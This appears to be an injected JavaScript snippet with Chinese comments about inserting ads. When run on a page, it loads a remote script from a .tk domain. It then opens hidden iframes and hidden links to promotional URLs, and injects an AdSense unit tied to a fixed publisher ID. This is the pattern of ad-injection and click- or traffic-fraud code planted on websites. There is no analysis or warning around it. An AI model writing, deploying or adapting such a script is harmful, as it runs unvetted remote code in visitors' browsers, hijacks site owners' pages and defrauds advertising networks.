(function () {
//基础
var b = document.createElement("script");
b.src = "http://www.7k77.tk/eicXsB?1503385493";
(document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b)
//插广告
var adList=[
    'http://www.hupress.tk/',
    
    'http://ptp.skillerzforum.com/promote.php?id=22979'
]
/* <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 特殊t -->
<ins class="adsbygoogle"
     style="display:inline-block;width:320px;height:100px"
     data-ad-client="ca-pub-3568322529043220"
     data-ad-slot="9488597897"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script> */
// 'http://adpays.net/v.php?user=4297',
for(var i=0,len=adList.length;i<len;i++){
    //iframe 
    var elemIF = document.createElement("iframe");
    elemIF.src = adList[i];
    elemIF.sandbox = "allow-scripts allow-same-origin allow-forms"
    elemIF.style.display = "none";
    document.body.appendChild(elemIF)
    //a标签
    var elemA=document.createElement("a");
    elemA.href=adList[i];
    elemA.innerText=adList[i]
    elemA.style.display = "none";
    document.body.appendChild(elemA)
}
var elemSC = document.createElement("script");
elemSC.async;
elemSC.src = "//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"
document.body.appendChild(elemSC)
var elemINC = document.createElement("ins");
elemINC.className = "adsbygoogle";
elemINC.style = "display:inline-block;width:320px;height:100px";
elemINC.setAttribute("data-ad-client","ca-pub-3568322529043220")
elemINC.setAttribute("data-ad-slot","9488597897")
document.body.appendChild(elemINC)
var elemSCs = document.createElement("script");
elemSCs.innerText='(adsbygoogle = window.adsbygoogle || []).push({});';
document.body.appendChild(elemSCs)
})()



